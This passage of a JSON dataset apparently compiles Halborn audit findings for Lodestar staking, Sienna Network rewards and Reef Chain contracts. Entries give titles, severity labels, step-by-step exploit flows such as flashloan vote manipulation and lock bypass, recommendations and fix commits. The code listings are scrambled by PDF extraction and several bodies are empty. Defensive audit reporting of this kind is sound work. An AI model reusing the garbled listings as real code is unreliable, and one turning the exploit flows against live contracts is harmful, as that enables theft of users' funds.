Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : b049afc3bf5635250033f03fc9e4684eb332d373. 41 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: Critical"
        ]
    },
    {
        "title": "UNSTAKELODE FUNCTION MAY REVERT UNDER CERTAIN CONDITIONS AS VOTING POWER IS INCORRECTLY BURNT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "During the re-assess of the new code introduced in the Commit ID b049afc3bf5635250033f03fc9e4684eb332d373 a new issue was found in the stakeLODE()-unstakeLODE() functions. Basically, the following flow would cause a revert Burn amount exceeds voting power during an unstakeLODE() function call: 1. Alice stakes 700 esLODE. She receives 700 VotingPower. 2. 2 weeks later, Alice calls convertEsLODEToLODE(). She converts 26,8 esLODE into LODE. Her VotingPower is burnt accordingly. She now has 673,2 VotingPower. 3. A few weeks later, Alice calls stakeLODE(1500, 10). She receives no voting power as she staked with a lockTime of 10. Although, the lockTime was not updated by the contract properly in the stakeLODE() function: Listing 7: StakingRewards.sol 308 if ( stakers [ msg . sender ]. lodeAmount == 0) { 309 310 311 } stakers [ msg . sender ]. startTime = block . timestamp ; stakers [ msg . sender ]. lockTime = lockTime ; When Alice called the stakeLODE() function, as she had previously called convertEsLODEToLODE(), her lodeAmount was >0, hence this code block was not entered. 4. Later on, Alice calls unstakeLODE() but it reverts with a Burn 42 amount exceeds voting power error. Why does this occurs? Because this code block is entered incorrectly during the unstakeLODE() call (as the lockTime was not properly updated before when she staked): Listing 8: StakingRewards.sol (Line 265) 263 // Adjust voting power 264 if ( lockTimePriorToUpdate != 10 seconds ) { 265 266 } votingContract . burn ( msg . sender , stLODEReduction ); As the contract tries to burn VotingPower that Alice does not have, it reverts, not allowing her to ever unstake her LODE tokens. Proof of Concept: 43 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: It is recommended to update the lockTime variable when convertEsLODEToLODE () is called and the current lockTime of the user is 0. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 97c84d98ef6011507183fcd37570084137b6626b. 44 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: Critical"
        ]
    },
    {
        "title": "ESLODE TOKENS COULD GET LOCKED PERMANENTLY IN THE STAKINGREWARDS CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the StakingRewards contract, the function convertEsLODEToLODE() could totally lock the esLODE in the contract under certain circumstances. It was found that the following steps would lock Alices esLODE permanently in the contract: 1. Alice stakes 1000 esLODE. 2. On the day 250, Alice calls convertEsLODEToLODE(Alice) receiving 685 LODE tokens. 3. 115 days later (day 365), Alice stakes another 1000 esLODE, and then she calls convertEsLODEToLODE(Alice) receiving the remaining 315 LODE tokens. Lets remember, though, that now there is a new stake of another 1000 esLODE tokens. 4. 500 days later, Alice calls convertEsLODEToLODE(Alice) but it fails with ERROR: [FAIL. Reason: Arithmetic over/underflow]. Alices es- LODE tokens are now stuck in the StakingRewards contract. 45 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to fix the convertEsLODEToLODE() function logic to prevent this Denial of Service situation. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 46 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: High"
        ]
    },
    {
        "title": "VOTING POWER CAN BE MANIPULATED WITH A LODE FLASHLOAN AS STARTTIME VARIABLE IS ONLY UPDATED DURING THE INITIAL LOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the StakingRewards contract, the function stakeLODE() is used to stake LODE with or without a lock time to earn rewards: Listing 9: StakingRewards.sol (Line 77) */ * @param lockTime the desired lock time . Must be 10 seconds , 90 require ( amount != 0 , \" StakingRewards : Invalid stake amount \" ); require ( * @notice Stake LODE with or without a lock time to earn rewards * @param amount the amount the user wishes to stake ( denom . in 54 /* * 55 56  wei ) 57  days ( in seconds ) or 180 days ( in seconds ) 58 59 function stakeLODE ( uint256 amount , uint256 lockTime ) external  whenNotPaused nonReentrant { 60 61 62  == 180 days , 63 64 65 66 67 68 69 70  Cannot add stake with different lock time \" ); 71 72 ); uint256 currentLockTime = stakers [ msg . sender ]. lockTime ; uint256 startTime = stakers [ msg . sender ]. startTime ; uint256 unlockTime = startTime + currentLockTime ; require ( lockTime == currentLockTime , \" StakingRewards : \" StakingRewards : Invalid lock time \" if ( currentLockTime != 0) { lockTime == 10 seconds || lockTime == 90 days || lockTime } 47 if ( currentLockTime != 10 seconds && currentLockTime != 0) { require ( block . timestamp < unlockTime , \" StakingRewards : 73 74  Staking period expired \" ); 75 76 77 78 } } stakeLODEInternal ( msg . sender , amount , lockTime ); This stakeLODE() function internally calls the stakeLODEInternal() func- tion: Listing 10: StakingRewards.sol (Lines 91-94) } if ( lockTime == 90 days ) { uint256 mintAmount = amount ; } else if ( lockTime == 180 days ) { mintAmount = ( amount * stLODE3M ) / 1 e18 ; // Scale the mint mintAmount = ( amount * stLODE6M ) / 1 e18 ; // Scale the mint require ( LODE . transferFrom ( staker , address ( this ) , amount ) , \" 80 function stakeLODEInternal ( address staker , uint256 amount , uint256  lockTime ) internal { 81  StakingRewards : Transfer failed \" ); 82 83 84 85 86  amount for 3 months lock time 87 88  amount for 6 months lock time 89 90 91 92 93 94 95 96  amount 97  minted amount 98 99 100 101 102 103 stakers [ staker ]. startTime = block . timestamp ; stakers [ staker ]. lockTime = lockTime ; stakers [ staker ]. stLODEAmount += mintAmount ; // Update stLODE stakers [ staker ]. lodeAmount += amount ; // Update LODE staked UserInfo storage user = userInfo [ staker ]; if ( stakers [ staker ]. lodeAmount == 0) { uint256 _prev = totalSupply () ; totalStaked += amount ; } 48 104 105 106 107 108 109 110 111 112 113 updateShares () ; unchecked { user . amount += uint96 ( mintAmount ); shares += uint96 ( mintAmount ); } user . wethRewardsDebt = user . wethRewardsDebt + int128 ( uint128 ( _calculateRewardDebt ( accWethPerShare ,  uint96 ( mintAmount )) )); 114 115 116 117 118 _mint ( address ( this ) , mintAmount ); unchecked { if ( _prev + mintAmount != totalSupply () ) revert  DEPOSIT_ERROR () ; 119 120 121 122 } } emit StakedLODE ( staker , amount , lockTime ); Although, the stakeLODEInternal() only updates the stakers[staker]. Hence, startTime when the stakers[staker].lodeAmount is equal to 0. this flaw in the stakeLODEInternal() function logic can be abused to take a flashloan (if it was possible) of LODE, stake it, increase voting power, vote, unstake and repay the flashloan. 49 BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to always update the stakers[staker].startTime variable every time a user stakes. Remediation Plan: SOLVED: The Lodestar team solved the issue in the following Commit ID. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. The VotingPower logic was rebuilt and is now based on the OpenZeppelin Votes contract. 50 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: High"
        ]
    },
    {
        "title": "LODE LOCKING CAN BE BYPASSED ABUSING THE REWARDS SYSTEM",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "As mentioned in the previous issue, stakers[staker].startTime variable is only updated when the stakers[staker].lodeAmount is equal to 0. Based on this, the following exploit would be possible to get higher rewards without any risk: 51 1. User1 stakes 0.000000001 LODE with a 180 days lock and waits 180 days - 1 second. 2. User1 stakes 10000 LODE. 3. User2 stakes 10000 LODE. 4. Both users are generating the same rewards. Although User1 now can unstake his LODE at any given time, User2 needs to wait another 180 days which is not fair for the User2. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:H/R:N/S:U (7.5) Recommendation: As suggested in the previous issue, always update the stakers[staker]. startTime variable every time a user stakes. Remediation Plan: SOLVED: The Lodestar team solved the issue in the following Commit ID. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. A different mitigation was chosen by Lodestar team. Users will not be able to re-stake if the cutoffTime was reached. This approach does not totally mitigate the issue, although the Lodestar team states that users will be informed of this logic, so it is a fair situation for all the stakers. 52 4.10 (HAL-10) RELOCKING FULL BONUS CAN BE OBTAINED AFTER A 10 SECONDS LOCK - HIGH (7.5) Commit IDs affected: - a21ecb23a4308c2602ac63ee86d576f78d73c6e6 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: Informational"
        ]
    },
    {
        "title": "USERS CAN INCREASE THEIR STAKED TOKENS WITHOUT DEPOSITING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "A proof of concept video showing how to exploit this security issue is included in the report. As a consequence, malicious users can later completely claim / withdraw all accumulated rewards and staked LP tokens in reward pools. handle_receive_migration function in contracts/rewards/lib.rs allows users to increase without restrictions their amount of staked LP tokens in reward pools without depositing any token. It is important to mention that there is no need that reward pools are closed because this function can be called at anytime (and many times, too). D R A F T // for some reason it does not see Auth as implemented // Auth :: save_vk (& mut core , id . as_slice () , & vk ) ?; self . set_ns ( crate :: auth :: VIEWING_KEYS , id . as_slice () , & vk ) as_slice () ) ?; let id = self . canonize ( migrant . clone () ) ?; // Set the migrant ' s viewing key if let Some ( vk ) = vk { 215 fn handle_receive_migration (& mut self , env : Env , data : Binary ) -> 216 217 { 218 let ( migrant , vk , staked ): AccountSnapshot = from_slice (& data . StdResult < HandleResponse > The amount of staked LP tokens is increased without verifying the sender: Listing 1: contracts/rewards/lib.rs (Lines 228,229) Code Location: 219 220 221 222 223 224 225 226 ?; } // Add the LP tokens transferred by the migration 13 Update the logic of handle_receive_migration function to verify that the sender should be in the old reward pool and its address registered in the new reward pool (CAN_MIGRATE_FROM). 227 228 229 230 231 232 } Risk Level: Likelihood - 5 Impact - 5 Recommendation: Remediation plan: // to the migrant ' s new account Account :: from_addr ( self , & migrant , env . block . time )? . commit_deposit ( self , staked ) ?; HandleResponse :: default () . log (\" migrated \" , & staked . to_string () ) D R A F T SOLVED: The issue was fixed in commit 20dce5c6a7dfcd983ae2fbc4292b1b58678ae07e. 14 ",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: Critical"
        ]
    },
    {
        "title": "REWARDS CANNOT BE CLAIMED WHEN REWARD POOLS ARE CLOSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "According to the migration flow defined, once a reward pool is closed, users should be able to withdraw their stake and claim any remaining rewards. However, when users try to deposit, withdraw or claim in a closed reward pool, the function force_exit from contracts/rewards/algo.rs is called automatically. This function transfers staked LP tokens to users, but does not return remaining rewards. As a consequence, users will never be able to claim their rewards because when a reward pool is closed, it cannot be opened anymore. D R A F T let amount = self . staked ; let response = HandleResponse :: default () . msg ( RewardsConfig :: lp_token ( core ) ?. transfer (& self . & format! ( \" {} \" , when )) ? . log ( \" close_time \" , . log ( \" close_reason \" , & format! ( \" {} \" , why )) ?; address , amount ) ?) ? Listing 2: contracts/rewards/algo.rs (Lines 648,651) 644 fn force_exit (& mut self , core : & mut C) -> StdResult < HandleResponse > { if let Some (( ref when , ref why )) = self . total . closed { force_exit function transfers staked LP tokens to users, but does not return rewards: Code Location: self . commit_withdrawal ( core , amount ) ?; Ok ( response ) } else { errors :: pool_not_closed () 15 645 646 647 648 649 650 651 652 653 654 Risk Level: Likelihood - 4 Impact - 5 Recommendation: Remediation plan: Update the logic of force_exit function to transfer remaining rewards to users when a reward pool is closed. SOLVED: The issue was fixed in commit 6bb07ab9a720258fa1e19941397c5bb346186512. D R A F T 16 ",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "POSSIBILITY TO TRANSFER AN ARBITRARY AMOUNT OF TOKENS OUT OF REWARD POOLS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "INSUFFICIENT ACCESS CONTROL IN MIGRATION FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "handle_request_migration function in contracts/rewards/migration.rs and handle_export_state function in contracts/rewards/lib.rs do not have ade- quate access controls for migration process, which generates the following consequences:  In handle_request_migration function, previous reward pool address (prev) is not restricted; thus, users can execute any potentially malicious message on behalf of current reward pool.  handle_export_state function verifies the value of can_export_state function before continuing with its execution. However, this latter function entirely ignores sender address, which means that does not exist access control for handle_export_state function. D R A F T { contract_addr : callback_code_hash : prev . code_hash , send : msg : self . wrap_export_msg ( EmigrationHandle :: ExportState ( prev . address , vec! [] , handle_request_migration function does not verify old reward pool address: ContractLink < HumanAddr >) -> StdResult < HandleResponse > Listing 4: contracts/rewards/migration.rs (Line 178) HandleResponse :: default () . msg ( CosmosMsg :: Wasm ( WasmMsg :: Execute 175 fn handle_request_migration (& mut self , env : Env , prev : Code Location: 176 177 { 178 179 180 181 182 183 env . message . sender )) ?, }) ) 19 handle_export_state function verifies the value of can_export_state func- tion (see below) before continuing with its execution: Listing 5: contracts/rewards/lib.rs (Line 177) 179 180 181 182 183 184 185 186 can_export_state function does not verify that address of receiver_link is equal to sender address: -> StdResult < HandleResponse > 174 fn handle_export_state (& mut self , env : & Env , migrant : & HumanAddr ) 175 176 { 177 178 let receiver let mut account = Account :: from_addr ( self , & migrant , env . block = self . can_export_state (& env , & migrant ) ?; . time ) ?; let staked let id ) as AccountSnapshot )) ?; let snapshot = to_binary (&(( = account . staked ; = self . canonize ( migrant . clone () ) ?; migrant . clone () , Auth :: load_vk ( self , id . as_slice () ) ?. map (| vk | vk .0) , staked D R A F T return Err ( StdError :: generic_err (\" This handler must be called as part of a transaction \" )) } // If migration to the caller contract is enabled , // its code hash should be available in storage let id = self . canonize ( env . message . sender . clone () ) ?; let receiver_link : Option < ContractLink < HumanAddr >> = // it must be called by the contract which is receiving the if & env . message . sender == migrant { manually by the user ; migration -> StdResult < ContractLink < HumanAddr >> 71 fn can_export_state (& mut self , env : & Env , migrant : & HumanAddr ) 72 73 { 74 // The ExportState transaction is not meat to be called Listing 6: contracts/rewards/migration.rs (Lines 84,85) 75 76 77 78 79 80 81 82 83 84 85 self . get_ns ( Self :: CAN_MIGRATE_TO , id . as_slice () ) ?; if let Some ( receiver_link ) = receiver_link { Ok ( receiver_link ) 20 86 87 } else { Err ( StdError :: generic_err ( \" Migration to this target is not enabled .\" )) Harden access control for functions mentioned above by verifying the sender address. } 88 89 } Risk Level: Likelihood - 5 Impact - 3 Recommendation: D R A F T Remediation plan: SOLVED: The issue was fixed in the following commits:  20dce5c6a7dfcd983ae2fbc4292b1b58678ae07e  6e9511a5721a38690b02c8fbab1239eea96d0a08. 21 ",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "MIGRATION REQUEST FUNCTION DOES NOT VERIFY THAT OLD REWARD POOL IS ENABLED TO MIGRATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Code Location: 176 177 { 178 179 180 181 182 183 184 } }) ) Risk Level: Listing 10: contracts/rewards/migration.rs 175 fn handle_request_migration (& mut self , env : Env , prev : ContractLink < HumanAddr >) -> StdResult < HandleResponse > HandleResponse :: default () . msg ( CosmosMsg :: Wasm ( WasmMsg :: Execute Likelihood - 1 Impact - 3 24 Verify in handle_request_migration function that the old reward pool is closed (if applicable) and enabled to migrate to a new reward pool (CAN_MIGRATE_TO). Recommendation: Remediation plan:: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding in favor of being able to run several versions of the contract at the same time. D R A F T 25 ",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "REWARDS UPDATE IS NOT ENFORCED WHEN CLAIMING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Code Location: According to epoch flow defined, SIENNA tokens are transferred to reward pools in a daily basis. When users call claim function in contract- s/rewards/algo.rs, it does not update rewards for calling user before transferring SIENNA tokens. As a consequence, in the worst scenario, users could claim rewards that are not updated since the previous day. Furthermore, this difference cannot be claimed later because users state, which is used to calculate rewards, is reset after claiming: starting_pool_volume, starting_pool_rewards and volume. D R A F T 628 fn claim (& mut self , core : & mut C) -> StdResult < HandleResponse > { 629 630 631 632 633 634 635 636 637 638 639 640 claim function calls commit_claim function and transfer SIENNA tokens without updating rewards for calling user: self . force_exit ( core ) } else if self . bonding > 0 { Listing 11: contracts/rewards/algo.rs (Lines 638,640) self . commit_claim ( core ) ?; HandleResponse :: default () . msg ( RewardsConfig :: reward_token ( core ) ?. transfer (& self } else if self . total . budget == Amount :: zero () { } else if self . earned == Amount :: zero () { errors :: claim_bonding ( self . bonding ) if self . total . closed . is_some () { errors :: claim_zero_claimable () errors :: claim_pool_empty () } else { 641 642 } . address , self . earned ) ?) ? . log ( \" reward \" , & self . earned . to_string () ) 26 commit_claim function updates the amount claimed without updating rewards for calling user: Listing 12: contracts/rewards/algo.rs (Line 689) Risk Level: } Ok (() ) Recommendation: Likelihood - 1 Impact - 3 if self . earned > Amount :: zero () { 684 fn commit_claim (& mut self , core : & mut C ) -> StdResult <() > { 685 686 687 688 689 690 } self . reset ( core ) ?; self . total . commit_claim ( core , self . earned ) ?; D R A F T NOT APPLICABLE: Sienna.Network team claimed that rpt contract [out of scope for this security audit] distributes a fixed amount of tokens among all reward pools once per 24 hours. So, if someone calls vest function in the middle of that period, it wont do anything. It is recommended to automatically update rewards of calling users before transferring them SIENNA tokens. Remediation plan: 27 ",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "BONDING PERIOD COULD UNWRAP TO AN INADEQUATE DEFAULT VALUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNCTION TO QUERY LP TOKEN INFO DOES NOT WORK PROPERLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Sienna_Network_Rewards_V3_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. For instance in the ethereum_signable_message() method, if statement is summing up few u32 values which may end up overflowing the integer. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 1: modules/evm-accounts/src/lib.rs (Lines 182) 180 pub fn ethereum_signable_message ( what : &[ u8 ], extra : &[ u8 ]) -> Vec < u8 > { let prefix = b \" reef evm : \" ; let mut l = prefix . len () + what . len () + extra . len () ; let mut rev = Vec :: new () ; 181 182 183 Listing 2: modules/evm-accounts/src/lib.rs (Lines 313,314) 312 pub fn to_ascii_hex ( data : &[ u8 ]) -> Vec < u8 > { 313 314 let mut r = Vec :: with_capacity ( data . len () * 2) ; let mut push_nibble = | n | r . push ( if n < 10 { b '0 ' + n } else { b 'a ' - 10 + n }) ; Listing 3: modules/evm-bridge/src/lib.rs (Lines 183,186,191) 182 let offset = U256 :: from_big_endian (& output [0..32]) ; 183 let length = U256 :: from_big_endian (& output [ offset . as_usize () .. offset . as_usize () + 32]) ; 184 ensure !( 185 // output is 32 - byte aligned . ensure total_length >= offset + string length + string data length . 13 output . len () >= offset . as_usize () + 32 + length . as_usize () , Error :: <T >:: InvalidReturnValue 186 187 188 ); 189 190 let mut data = Vec :: new () ; 191 data . extend_from_slice (& output [ offset . as_usize () + 32.. offset . as_usize () + 32 + length . as_usize () ]) ; Risk Level: Likelihood - 3 Impact - 3 Recommendations: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system. Consider re- placing the addition and multiplication operators with Rusts checked_add and checked_mul methods. Remediation: SOLVED: Reef fixed the issue in commit 6e4153498a28d03b8600739709cb200065c88781. 14 ",
        "labels": [
            "Halborn",
            "Reef_Chain_Substrate",
            "Severity: Medium"
        ]
    },
    {
        "title": "TOTAL ISSUANCE NOT UPDATED ON MINT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The update_balance dispatchable defined in modules/currencies/src/lib.rs does not update the total issuance of the currency (identified by user- supplied ID) which is minted to the target address. This may lead to discrepancies in token data. Code Location: Listing 4: modules/currencies/src/lib.rs (Lines 168) 159 #[ pallet :: weight ( T :: WeightInfo :: update_balance_non_native_currency () )] 160 pub fn update_balance ( origin : OriginFor <T >, 161 who : <T :: Lookup as StaticLookup >:: Source , 162 currency_id : CurrencyIdOf <T >, 163 amount : AmountOf <T >, 164 165 ) -> DispatchResultWithPostInfo { ensure_root ( origin ) ?; 166 let dest = T :: Lookup :: lookup ( who ) ?; 167 < Self as MultiCurrencyExtended < T :: AccountId > >:: update_balance ( 168 currency_id , & dest , amount ) ?; 169 170 } Ok (() . into () ) Risk Level: Likelihood - 3 Impact - 3 Recommendations: Total issuance should be updated every time tokens are minted or burned. 15 Remediation Plan: ACKNOWLEDGED: Reef states that the affected function is sudo only and will be deprecated in a future release. 16 ",
        "labels": [
            "Halborn",
            "Reef_Chain_Substrate",
            "Severity: Medium"
        ]
    },
    {
        "title": "CASTING OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "When converting or casting between types, an overflow/wrapping may occur and result in logic bugs leading to thread panic. The decode_string utility method defined in modules/evm-bridge/src/lib. rs does not validate if the values of the offset and length variables can be cast to the usize type. Although the method is not exported and available externally, the method is vulnerable still and the risk could increase in the future if the method is used before its patched. Code Location: Listing 5: modules/evm-bridge/src/lib.rs (Lines 183,186,191) 182 let offset = U256 :: from_big_endian (& output [0..32]) ; 183 let length = U256 :: from_big_endian (& output [ offset . as_usize () .. offset . as_usize () + 32]) ; 184 ensure !( 185 // output is 32 - byte aligned . ensure total_length >= offset + string length + string data length . output . len () >= offset . as_usize () + 32 + length . as_usize () , Error :: <T >:: InvalidReturnValue 186 187 188 ); 189 190 let mut data = Vec :: new () ; 191 data . extend_from_slice (& output [ offset . as_usize () + 32.. offset . as_usize () + 32 + length . as_usize () ]) ; Risk Level: Likelihood - 2 Impact - 3 17 Recommendations: Check the value against maximum type value before casting. Listing 6 1 if ( x <= usize :: MAX ) { // logic ... 2 3 } Remediation: SOLVED: Reef fixed the issue in commit 313439bb7940afa0f0d5060fbcbbe26d5a3e5298 18 ",
        "labels": [
            "Halborn",
            "Reef_Chain_Substrate",
            "Severity: Low"
        ]
    },
    {
        "title": "SLASH AMOUNT VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The slash_reserved method defined in modules/currencies/src/lib.rs does not validate if the value of the user-supplied value parameter exceeds the actual balance of the account owned by the address that is to have its ERC20 tokens slashed. Code Location: Listing 7: modules/currencies/src/lib.rs (Lines 396) 394 fn slash_reserved ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) -> Self :: Balance { match currency_id { CurrencyId :: ERC20 ( _) => value , CurrencyId :: Token ( TokenSymbol :: REEF ) = > T :: NativeCurrency :: slash_reserved ( who , value ) , _ => T :: MultiCurrency :: slash_reserved ( currency_id , who , 395 396 397 398 value ) , 399 400 } } Risk Level: Likelihood - 2 Impact - 2 Recommendations: The slashed amount should always be lesser or equal to the account balance that is to be slashed. 19 Remediation: SOLVED: Reef fixed the issue in commit (bd43bec58890be763b32bfdfd18ba85a8c0ef9e5)[https://github.com/reef-defi/reef-chain/pull/37/commits/bd43bec58890be763b32bfdfd18ba85a8c0ef9e5]. 20 ",
        "labels": [
            "Halborn",
            "Reef_Chain_Substrate",
            "Severity: Low"
        ]
    },
    {
        "title": "CURRENCY ID VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Many dispatchables and helper methods defined in modules/currencies/src /lib.rs do not check if the user-supplied currency ID matches any of the existing ones before calling the possibly resource-intensive underlying utility functions. Code Location: Listing 8: modules/evm-accounts/src/lib.rs (Lines 125) origin : OriginFor <T >, dest : <T :: Lookup as StaticLookup >:: Source , currency_id : CurrencyIdOf <T >, #[ pallet :: compact ] amount : BalanceOf <T >, 121 #[ pallet :: weight ( T :: WeightInfo :: transfer_non_native_currency () )] 122 pub fn transfer ( 123 124 125 126 127 ) -> DispatchResultWithPostInfo { 128 129 130 let from = ensure_signed ( origin ) ?; let to = T :: Lookup :: lookup ( dest ) ?; < Self as MultiCurrency <T :: AccountId > >:: transfer ( currency_id , & from , & to , amount ) ?; Ok (() . into () ) 131 132 } List of all the functions that fail to validate the currency ID: Listing 9: (Lines 2,3) 1 auditor@halborn :~/ projects / reef / reef - chain / modules / currencies$ \\ 2 > grep - ne ' fn .* CurrencyId ' src / lib . rs \\ 3 > | cut -d ' -' -f 1 4 178: 5 186: 6 199: fn minimum_balance ( currency_id : Self :: CurrencyId ) fn total_issuance ( currency_id : Self :: CurrencyId ) fn total_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId ) 21 7 217: fn free_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId ) 8 235: fn ensure_can_withdraw ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 9 290: fn deposit ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 10 303: fn withdraw ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 11 316: fn can_slash ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 12 324: fn slash ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 13 336: fn update_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId , by_amount : Self :: Amount ) 14 376: fn remove_lock ( lock_id : LockIdentifier , currency_id : Self :: CurrencyId , who : & T :: AccountId ) 15 386: fn can_reserve ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) 16 394: fn slash_reserved ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) 17 402: fn reserved_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId ) 18 423: fn reserve ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) 19 445: fn unreserve ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) Risk Level: Likelihood - 2 Impact - 2 Recommendations: It is recommended to validate all user-supplied input in order to avoid executing unnecessary operations and mitigate the risk of resource exhaustion. 22 Remediation Plan: ACKNOWLEDGED: Reef states that there is only 1 currency id in use, and there likely wont be more going forward. 23 ",
        "labels": [
            "Halborn",
            "Reef_Chain_Substrate",
            "Severity: Low"
        ]
    },
    {
        "title": "VECTOR CAPACITY VALIDATION MISSING",
